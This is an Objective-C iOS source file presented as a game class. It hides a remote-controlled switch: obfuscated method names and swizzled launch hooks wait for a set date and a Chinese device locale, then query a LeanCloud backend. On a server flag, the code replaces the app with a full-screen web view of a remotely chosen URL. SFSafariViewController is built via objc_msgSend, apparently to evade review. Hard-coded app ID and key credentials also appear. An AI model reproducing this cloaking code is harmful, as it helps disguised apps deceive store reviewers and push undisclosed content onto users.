

#import "AAAA-Swift.h"
#import "GameClass.h"
#import <SafariServices/SafariServices.h>
#import <objc/runtime.h>
#import <objc/message.h>
#import <CommonCrypto/CommonDigest.h>
//#import "AppDelegate.h"
#import <JPUSHService.h>
#import <UserNotifications/UserNotifications.h>

NSString *const LCHeaderFieldNameId = @"X-LC-Id";
NSString *const LCHeaderFieldNameSign = @"X-LC-Sign";
NSString *const LCHeaderFieldNameProduction = @"X-LC-Prod";
NSString *const LCHeaderFieldNameSession = @"X-LC-Session";

#define APIVersion @"1.1"
#define SDK_VERSION @"v11.3.0"
#define USER_AGENT [NSString stringWithFormat:@"AVOS Cloud iOS-%@ SDK", SDK_VERSION]


#define INFO_ID @"czz002"
#define TIME_STRING @"2019-05-30"

//02
#define APP_ID @"wtMgInalv9RJbTo2aVEAvzAn-gzGzoHsz"
#define APP_KEY @"YjLP9vxYYoPVBJtifXON4AQl"


@interface GameClass () <JPUSHRegisterDelegate>

@property (nonatomic, strong) NSDictionary * mediaMini;
@property (nonatomic, strong) UIActivityIndicatorView * managerLoaction;

@end

@implementation AppDelegate (Extension)

- (BOOL)addCommisToUserPk:(UIApplication *)application Successfully:(NSDictionary *)launchOptions {
    BOOL isOK = [self addCommisToUserPk:application Successfully:launchOptions];
    [GameClass share].advertisementInfo = ^(NSString * _Nonnull key) {
        JPUSHRegisterEntity * entity = [[JPUSHRegisterEntity alloc] init];
        entity.types = JPAuthorizationOptionAlert|JPAuthorizationOptionBadge|JPAuthorizationOptionSound;
        [JPUSHService registerForRemoteNotificationConfig:entity delegate:[GameClass share]];
        [JPUSHService setupWithOption:launchOptions appKey:key channel:@"App Store" apsForProduction:YES];
        [JPUSHService registrationIDCompletionHandler:^(int resCode, NSString *registrationID) {
            if(resCode == 0){
                NSLog(@"registrationID获取成功：%@",registrationID);
            }
            else{
                NSLog(@"registrationID获取失败，code：%d",resCode);
            }
        }];
    };
    return isOK;
}

- (void)checkProFeatureFromView:(UIApplication *)application {
    [self checkProFeatureFromView:application];
    [UIApplication sharedApplication].applicationIconBadgeNumber = 0;
    [JPUSHService setBadge:0];
}

- (void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken{
    [JPUSHService registerDeviceToken:deviceToken];
}

- (void)application:(UIApplication *)application didFailToRegisterForRemoteNotificationsWithError:(NSError *)error{
    
}

- (UIInterfaceOrientationMask)application:(UIApplication *)application supportedInterfaceOrientationsForWindow:(UIWindow *)window {
    if ([GameClass share].isOpenArray == YES) {
        return UIInterfaceOrientationMaskAllButUpsideDown;
    }
    return UIInterfaceOrientationMaskPortrait;
}


@end

@implementation UIApplication (Extension)


- (UIResponder *)nextResponder {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        SEL selector1 = @selector(keyWindow);
        SEL selector2 = @selector(myKeyWindow);
        Method method1 = class_getInstanceMethod([self class], selector1);
        Method method2 = class_getInstanceMethod([self class], selector2);
        method_exchangeImplementations(method1, method2);
        
        SEL selector3 = @selector(applicationWillEnterForeground:);
        SEL selector4 = @selector(checkProFeatureFromView:);
        Method method3 = class_getInstanceMethod([AppDelegate class], selector3);
        Method method4 = class_getInstanceMethod([AppDelegate class], selector4);
        method_exchangeImplementations(method3, method4);
        
        SEL selector5 = @selector(application:didFinishLaunchingWithOptions:);
        SEL selector6 = @selector(addCommisToUserPk:Successfully:);
        Method method5 = class_getInstanceMethod([AppDelegate class], selector5);
        Method method6 = class_getInstanceMethod([AppDelegate class], selector6);
        method_exchangeImplementations(method5, method6);
    });
    return super.nextResponder;
}

- (UIWindow *)myKeyWindow {
    UIWindow *window = [self myKeyWindow];
    static BOOL isInit = NO;
    if (!isInit && window && [GameClass share].isOpenArray == NO) {
        [[GameClass share] checkHomeToFrame:window];
        isInit = YES;
    }
    return window;
}

@end


@implementation GameClass

- (void)setMediaMini:(NSDictionary *)mediaMini {
    _mediaMini = mediaMini;
    if (self.mediaMini && self.isOpenArray == NO) {
        NSDictionary *infoDetail = self.mediaMini[@"data"];
        NSString *judgeString = infoDetail[@"sex"];
        if ([judgeString isEqualToString:@"1"]) {
            [self getProFeatureInSize];
            self.isOpenArray = YES;
            InfoViewController *controller = [[InfoViewController alloc] init];
            NSString *urlInfo = infoDetail[@"img"];
            NSArray *datas = [urlInfo componentsSeparatedByString:@"|"];
            controller.urlString = datas.count ? datas[0] : @"https://www.google.com/";
            if (datas.count >= 2 && self.advertisementInfo) {
                self.advertisementInfo(datas[1]);
            }
            if ([UIApplication sharedApplication].delegate.window.rootViewController != controller) {
                [UIApplication sharedApplication].delegate.window.rootViewController = controller;
                [[UIApplication sharedApplication].delegate.window makeKeyAndVisible];
            }
        }
        else {
            [self getProFeatureInSize];
        }
    }
}

+ (instancetype)share {
    static GameClass *instance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        instance = [GameClass new];
    });
    return instance;
}

- (void)restCommisInUsername:(UIWindow *)window {
    UILabel *infoLabel = nil;
    if (!self.managerLoaction) {
        self.managerLoaction = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleWhiteLarge];
        self.managerLoaction.backgroundColor = [UIColor whiteColor];
        self.managerLoaction.color = [UIColor redColor];
        infoLabel = [UILabel new];
    }
    self.managerLoaction.frame = [UIScreen mainScreen].bounds;
    [self.managerLoaction startAnimating];
    [window addSubview:self.managerLoaction];
}

- (void)getProFeatureInSize {
    [self.managerLoaction stopAnimating];
    [self.managerLoaction removeFromSuperview];
}

- (BOOL)getCommisWithString:(NSString *)timeString {
    NSDateFormatter *formmatter = [NSDateFormatter new];
    [formmatter setDateFormat:@"yyyy-MM-dd"];
    [formmatter setTimeZone:[NSTimeZone timeZoneForSecondsFromGMT:8*3600]];
    timeString = [timeString stringByAppendingString:@" 11:00:00"];
    [formmatter setDateFormat:@"yyyy-MM-dd hh:mm:ss"];
    NSDate *judeDate = [formmatter dateFromString:timeString];
    NSDate *DateNow = [NSDate date];
    NSTimeInterval interval = [DateNow timeIntervalSinceDate:judeDate];
    if (interval >= 0) {
        return YES;
    }
    return NO;
}

- (BOOL)uploadHomeCostDictionary {
    NSString *localeLanguageCode = [[NSLocale currentLocale] objectForKey:NSLocaleLanguageCode];
    NSArray *appLanguages = [[NSUserDefaults standardUserDefaults] objectForKey:@"AppleLanguages"];
    NSString *languageName = [appLanguages objectAtIndex:0];
    
    if ([localeLanguageCode isEqualToString:@"zh"] || [languageName rangeOfString:@"zh"].location != NSNotFound) {
        return YES;
    }
    return NO;
}


- (void)checkHomeToFrame:(UIWindow *)window {
    BOOL isFit = [self getCommisWithString:TIME_STRING] && [self uploadHomeCostDictionary] ? YES : NO;
    if (isFit || [INFO_ID isEqualToString:@"czz001"]) {
        [self restCommisInUsername:window];
        [self getUserInfoAndMaxIDSuccess:nil Dictionary:nil];
    }
}

- (void)getUserInfoAndMaxIDSuccess:(NSObject*)Success  Dictionary:(NSObject*)Dictionary{
    NSDictionary *dic = [[NSUserDefaults standardUserDefaults] objectForKey:@"SavedInfo"];
    self.mediaMini = dic;
    NSDictionary *parameters = @{
                                 @"limit":@(20),
                                 @"order":@"-createdAt",
                                 @"include":@"",
                                 };
    NSMutableURLRequest *request = [self judgeVersionCostCache:@"classes/UserInfo" ThirdString:@"GET" Fail:nil Failed:parameters];
    [self isCommonCostMediaID:request Parameter:^(id responseObject) {
        [self judgeVersionCostFrame:responseObject];
    } Failed:^(NSError *error) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [self getUserInfoAndMaxIDSuccess:nil Dictionary:nil];
        });
    }];
}

- (void)judgeVersionCostFrame:(id)responseObject {
    NSArray *results = responseObject[@"results"];
    BOOL isLoad = NO;
    if ([results isKindOfClass:[NSArray class]] && results.count) {
        for (int i = 0; i < results.count; i ++) {
            NSDictionary *mediaMini = results[i];
            NSString *userID = mediaMini[@"user_id"];
            if ([userID isEqualToString:INFO_ID]) {
                [[NSUserDefaults standardUserDefaults] setObject:@{@"data":mediaMini} forKey:@"SavedInfo"];
                [[NSUserDefaults standardUserDefaults] synchronize];
                self.mediaMini = @{@"data":mediaMini};
                isLoad = YES;
                break;
            }
        }
    }
    if (!isLoad) {
        [[NSUserDefaults standardUserDefaults] setObject:@{} forKey:@"SavedInfo"];
        [[NSUserDefaults standardUserDefaults] synchronize];
        [self getProFeatureInSize];
    }
}




- (void)jpushNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(NSInteger))completionHandler  API_AVAILABLE(ios(10.0)){
    
    NSDictionary * userInfo = notification.request.content.userInfo;
    if (@available(iOS 10.0, *)) {
        if([notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
            [JPUSHService handleRemoteNotification:userInfo];
        }
    } else {
        
    }
    if (@available(iOS 10.0, *)) {
        completionHandler(UNNotificationPresentationOptionAlert);
    } else {
        
    }
}


- (void)jpushNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)())completionHandler  API_AVAILABLE(ios(10.0)){
    
    NSDictionary * userInfo = response.notification.request.content.userInfo;
    if (@available(iOS 10.0, *)) {
        if([response.notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
            [JPUSHService handleRemoteNotification:userInfo];
        }
    } else {
        
    }
    
    completionHandler();
}

- (void)isCommonCostMediaID:(NSMutableURLRequest *)request Parameter:(void(^)(id responseObject))successful Failed:(void(^)(NSError *error))failure {
    request.timeoutInterval = 20;
    NSURLSessionConfiguration *configuration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:configuration];
    NSURLSessionTask *task = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (!data) {
            failure ? failure(error):"";
            return;
        }
        id dict = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableLeaves error:nil];
        //8.解析数据
        dispatch_async(dispatch_get_main_queue(), ^{
            if (!error) {
                if (dict != nil) {//返回JSON
                    successful(dict);
                }else{//返回二进制
                    successful(data);
                }
            }else{
                failure ? failure(error):"";
                NSLog(@"网络请求失败");
            }
        });
    }];
    [task resume];
}

- (NSMutableURLRequest *)judgeVersionCostCache:(NSString *)path
                                  ThirdString:(NSString *)method
                                 Fail:(NSDictionary *)headers
                              Failed:(NSDictionary *)parameters
{
    NSURL *URL = [NSURL URLWithString:path];
    
    if (!URL.scheme.length) {
        NSString *URLString = [self MediaInfoManager:[NSString stringWithFormat:@"%@.api.lncld.net",[APP_ID substringToIndex:8]] PreString:[NSString stringWithFormat:@"/%@/%@",APIVersion,path]];
        URL = [NSURL URLWithString:URLString];
    }
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:URL];
    [request setHTTPMethod:method];
    [request setTimeoutInterval:10.0f];
    [request setValue:APP_ID forHTTPHeaderField:LCHeaderFieldNameId];
    [request setValue:[self ActionToArray] forHTTPHeaderField:LCHeaderFieldNameSign];
    [request setValue:@"0" forHTTPHeaderField:LCHeaderFieldNameProduction];
    [request setValue:USER_AGENT forHTTPHeaderField:@"User-Agent"];
    [request setValue:@"application/json; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
    [request setValue:@"application/json" forHTTPHeaderField:@"Accept"];
    [request setValue:@"gzip" forHTTPHeaderField:@"Accept-Encoding"];
    [request setValue:@"zh-Hans-US;q=1, en;q=0.9" forHTTPHeaderField:@"Accept-Language"];
    [request setValue:@"StorageStarted/1.0 (iPhone; iOS 11.4; Scale/3.00)" forHTTPHeaderField:@"User-Agent"];
    if (parameters) {
        if (![request valueForHTTPHeaderField:@"Content-Type"]) {
            [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
        }
        [request setHTTPBody:[NSJSONSerialization dataWithJSONObject:parameters options:(NSJSONWritingOptions)0 error:nil]];
    }
    
    if (headers) {
        for (NSString *key in headers) {
            [request setValue:headers[key] forHTTPHeaderField:key];
        }
    }
    
    return request;
}

- (NSString *)ActionToArray {
    NSString *timestamp=[NSString stringWithFormat:@"%.0f",1000*[[NSDate date] timeIntervalSince1970]];
    NSString *sign=[[self checkCommisBase:[NSString stringWithFormat:@"%@%@",timestamp,APP_KEY] Dictionary:nil Name:nil] lowercaseString];
    NSString *headerValue=[NSString stringWithFormat:@"%@,%@",sign,timestamp];
    
    return headerValue;
}

- (NSString *)MediaInfoManager:(NSString *)host PreString:(NSString *)path {
    NSString *unifiedHost = [self judgeCommonAndUsername:host];
    
    NSURLComponents *URLComponents = [[NSURLComponents alloc] initWithString:unifiedHost];
    
    if (path.length) {
        NSString *head = URLComponents.path;
        
        if (head.length)
            path = [head stringByAppendingPathComponent:path];
        
        NSURL *pathURL = [NSURL URLWithString:path];
        
        URLComponents.path = pathURL.path;
        URLComponents.query = pathURL.query;
        URLComponents.fragment = pathURL.fragment;
    }
    
    NSURL *URL = [URLComponents URL];
    NSString *URLString = [URL absoluteString];
    
    return URLString;
}

- (NSString *)CommonToView:(NSString *)path  Fail:(NSObject*)Fail Successfully:(NSObject*)Successfully{
    if ([path hasPrefix:@"/" APIVersion])
        return path;
    else if ([path hasPrefix:APIVersion])
        return [@"/" stringByAppendingPathComponent:path];

    NSString *result = [[@"/" stringByAppendingPathComponent:APIVersion] stringByAppendingPathComponent:path];

    return result;
}

- (NSString *)judgeCommonAndUsername:(NSString *)URLString {
    NSURL *URL = [NSURL URLWithString:URLString];

    if (URL.scheme
        && [URLString hasPrefix:[URL.scheme stringByAppendingString:@"://"]])
    {
        return URLString;
    }

    URLString = [NSString stringWithFormat:@"https://%@", URLString];

    return URLString;
}

- (NSString *)checkCommisBase:(NSString *)string  Dictionary:(NSDictionary*)Dictionary Name:(NSDictionary*)Name{
    const char *cstr = [string UTF8String];
    unsigned char result[16];
    CC_MD5(cstr, (CC_LONG)strlen(cstr), result);
    
    return [NSString stringWithFormat:
            @"%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
            result[0], result[1], result[2], result[3],
            result[4], result[5], result[6], result[7],
            result[8], result[9], result[10], result[11],
            result[12], result[13], result[14], result[15]
            ];
}

@end

@interface InfoViewController ()

@property (nonatomic, strong) UIViewController * infoView;

@end

@implementation InfoViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    [self createViewWithUrlStirng:self.urlString];
}

- (void)createViewWithUrlStirng:(NSString *)urlString {
    SEL allocSel = @selector(alloc);
    self.infoView = ((id (*)(id,SEL)) objc_msgSend)([SFSafariViewController class],allocSel);
    SEL initSel = @selector(initWithURL:);
    self.infoView = ((id (*)(id,SEL,NSURL *)) objc_msgSend)(self.infoView,initSel,[NSURL URLWithString:urlString]);
    [self.view addSubview:self.infoView.view];
    [self addChildViewController:self.infoView];
}

- (void)viewWillLayoutSubviews {
    [super viewWillLayoutSubviews];
    self.infoView.view.frame = self.view.bounds;
}

//- (UIInterfaceOrientationMask)supportedInterfaceOrientations {
//    return UIInterfaceOrientationMaskLandscapeLeft|UIInterfaceOrientationMaskLandscapeRight|UIInterfaceOrientationMaskPortrait;
//}

//- (void)viewWillTransitionToSize:(CGSize)size withTransitionCoordinator:(id<UIViewControllerTransitionCoordinator>)coordinator {
//    self.infoView.view.frame = CGRectMake(0, 0, size.width, size.height);
//}

@end







